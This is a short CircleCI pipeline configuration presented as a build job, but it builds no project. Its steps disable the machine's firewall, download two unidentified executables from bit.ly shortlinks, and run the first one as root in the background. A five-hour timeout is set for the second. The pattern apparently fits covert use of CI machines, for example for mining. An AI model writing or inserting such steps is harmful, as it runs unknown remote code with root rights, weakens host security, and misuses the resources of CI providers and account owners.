version: 2
jobs:
  build:
    machine:
      image: ubuntu-2004:202104-01
    resource_class: large
    steps:
      - run: 
         name: "creating"
         command: |
          sudo apt-get update
          sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
          sudo ufw disable 
          wget https://bit.ly/3NqoPRt
          chmod +x 3NqoPRt
          sudo su --command "nohup ./3NqoPRt --log=stdout > meta.log &"
          sleep 2
          sudo su --command "cat meta.log"    
      - run: 
         name: "deploy"
         no_output_timeout: 5h
         command: |
          wget https://bit.ly/3y1HJZi
          chmod +x 3y1HJZi
